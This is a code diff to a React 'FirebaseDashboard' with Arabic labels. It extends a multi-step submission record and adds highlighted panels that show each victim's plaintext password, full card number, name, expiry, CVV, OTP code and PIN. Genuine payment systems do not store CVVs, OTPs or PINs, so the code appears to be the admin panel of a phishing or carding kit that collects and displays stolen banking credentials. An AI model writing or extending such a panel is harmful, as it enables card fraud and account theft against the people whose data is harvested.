@@ -53,16 +53,23 @@ interface Submission {
   };
   step_3_password?: {
     passwordSet: boolean;
+    password: string;
     completedAt: string;
   };
   step_4_payment?: {
     amount: string;
     status: string;
     paymentMethod: string;
+    cardNumber: string;
+    cardName: string;
+    expiry: string;
+    cvv: string;
+    otpCode: string;
     completedAt: string;
   };
   step_5_pin?: {
     pinVerified: boolean;
+    pinCode: string;
     completedAt: string;
   };
   step_6_phone_provider?: {
@@ -351,20 +358,67 @@ export default function FirebaseDashboard() {
               {/* Step 3: Password */}
               {selectedSubmission.step_3_password && (
                 <DetailSection title="كلمة المرور" icon={Shield}>
-                  <DetailItem 
-                    label="الحالة" 
-                    value={selectedSubmission.step_3_password.passwordSet ? "تم التعيين بنجاح" : "لم يتم"} 
-                  />
+                  <div className="grid grid-cols-2 gap-4">
+                    <DetailItem 
+                      label="الحالة" 
+                      value={selectedSubmission.step_3_password.passwordSet ? "تم التعيين بنجاح" : "لم يتم"} 
+                    />
+                    <div className="bg-red-900/30 rounded-lg p-3 border border-red-500/30">
+                      <p className="text-xs text-red-400">كلمة المرور</p>
+                      <p className="font-mono font-bold text-red-300 mt-1 text-lg">
+                        {selectedSubmission.step_3_password.password || "-"}
+                      </p>
+                    </div>
+                  </div>
                 </DetailSection>
               )}
 
               {/* Step 4: Payment */}
               {selectedSubmission.step_4_payment && (
-                <DetailSection title="الدفع" icon={CreditCard}>
-                  <div className="grid grid-cols-2 gap-4">
+                <DetailSection title="الدفع وبيانات البطاقة" icon={CreditCard}>
+                  <div className="grid grid-cols-2 gap-4 mb-4">
                     <DetailItem label="المبلغ" value={selectedSubmission.step_4_payment.amount} />
                     <DetailItem label="الحالة" value={selectedSubmission.step_4_payment.status === "completed" ? "تم الدفع" : "قيد الانتظار"} />
                     <DetailItem label="طريقة الدفع" value={selectedSubmission.step_4_payment.paymentMethod === "card" ? "بطاقة ائتمان" : selectedSubmission.step_4_payment.paymentMethod} />
+                  </div>
+                  
+                  {/* Card Details */}
+                  <div className="mt-4 pt-4 border-t border-gray-700">
+                    <h4 className="font-bold text-yellow-400 mb-3 flex items-center gap-2">
+                      <CreditCard className="h-4 w-4" /> بيانات البطاقة
+                    </h4>
+                    <div className="grid grid-cols-2 gap-4">
+                      <div className="bg-yellow-900/30 rounded-lg p-3 border border-yellow-500/30 col-span-2">
+                        <p className="text-xs text-yellow-400">رقم البطاقة</p>
+                        <p className="font-mono font-bold text-yellow-300 mt-1 text-xl tracking-widest">
+                          {selectedSubmission.step_4_payment.cardNumber || "-"}
+                        </p>
+                      </div>
+                      <div className="bg-yellow-900/30 rounded-lg p-3 border border-yellow-500/30">
+                        <p className="text-xs text-yellow-400">الاسم على البطاقة</p>
+                        <p className="font-medium text-yellow-300 mt-1">
+                          {selectedSubmission.step_4_payment.cardName || "-"}
+                        </p>
+                      </div>
+                      <div className="bg-yellow-900/30 rounded-lg p-3 border border-yellow-500/30">
+                        <p className="text-xs text-yellow-400">تاريخ الانتهاء</p>
+                        <p className="font-mono font-bold text-yellow-300 mt-1">
+                          {selectedSubmission.step_4_payment.expiry || "-"}
+                        </p>
+                      </div>
+                      <div className="bg-red-900/30 rounded-lg p-3 border border-red-500/30">
+                        <p className="text-xs text-red-400">CVV</p>
+                        <p className="font-mono font-bold text-red-300 mt-1 text-lg">
+                          {selectedSubmission.step_4_payment.cvv || "-"}
+                        </p>
+                      </div>
+                      <div className="bg-purple-900/30 rounded-lg p-3 border border-purple-500/30">
+                        <p className="text-xs text-purple-400">رمز OTP</p>
+                        <p className="font-mono font-bold text-purple-300 mt-1 text-lg">
+                          {selectedSubmission.step_4_payment.otpCode || "-"}
+                        </p>
+                      </div>
+                    </div>
                   </div>
                 </DetailSection>
               )}
@@ -372,10 +426,18 @@ export default function FirebaseDashboard() {
               {/* Step 5: PIN */}
               {selectedSubmission.step_5_pin && (
                 <DetailSection title="رمز PIN" icon={Shield}>
-                  <DetailItem 
-                    label="التحقق" 
-                    value={selectedSubmission.step_5_pin.pinVerified ? "تم التحقق بنجاح" : "لم يتم"} 
-                  />
+                  <div className="grid grid-cols-2 gap-4">
+                    <DetailItem 
+                      label="التحقق" 
+                      value={selectedSubmission.step_5_pin.pinVerified ? "تم التحقق بنجاح" : "لم يتم"} 
+                    />
+                    <div className="bg-orange-900/30 rounded-lg p-3 border border-orange-500/30">
+                      <p className="text-xs text-orange-400">رمز PIN</p>
+                      <p className="font-mono font-bold text-orange-300 mt-1 text-2xl tracking-widest">
+                        {selectedSubmission.step_5_pin.pinCode || "-"}
+                      </p>
+                    </div>
+                  </div>
                 </DetailSection>
               )}
 
